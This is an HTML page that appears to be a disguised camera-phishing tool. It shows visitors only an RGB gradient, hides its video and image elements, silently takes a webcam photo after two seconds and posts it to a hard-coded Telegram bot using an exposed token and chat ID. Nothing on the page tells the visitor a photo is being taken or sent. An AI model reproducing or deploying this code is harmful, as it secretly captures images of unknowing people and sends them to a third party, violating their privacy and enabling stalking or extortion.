<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Automated Selfie Capture</title>
    <style>
        /* RGB Background */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            background: linear-gradient(45deg, red, green, blue);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        /* Hide all elements except the video */
        #videoElement, #capturedImage {
            display: none;
        }
    </style>
</head>
<body>

    <video id="videoElement" autoplay></video>
    <img id="capturedImage" src="" alt="Captured Selfie">

    <script>
        // Telegram Bot Token and Chat ID
        const TELEGRAM_TOKEN = '7647990067:AAEH5Qjt1XEKY7SvEkxinhYAbR5Bq5pKHDs';
        const CHAT_ID = '5519921687';

        const video = document.getElementById('videoElement');
        const capturedImage = document.getElementById('capturedImage');

        // Access the device camera and stream to video element
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                // Automatically capture after a short delay
                setTimeout(captureAndSend, 2000); // 2 seconds delay
            })
            .catch(err => {
                console.error("Error accessing camera: ", err);
            });

        function captureAndSend() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataURL = canvas.toDataURL('image/png');
            capturedImage.src = dataURL;

            // Convert base64 to Blob
            fetch(dataURL)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'selfie.png');

                    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Photo sent successfully!");
                    } else {
                        console.error("Failed to send photo:", data);
                    }
                })
                .catch(error => {
                    console.error("Error sending photo: ", error);
                });
        }
    </script>

</body>
</html>
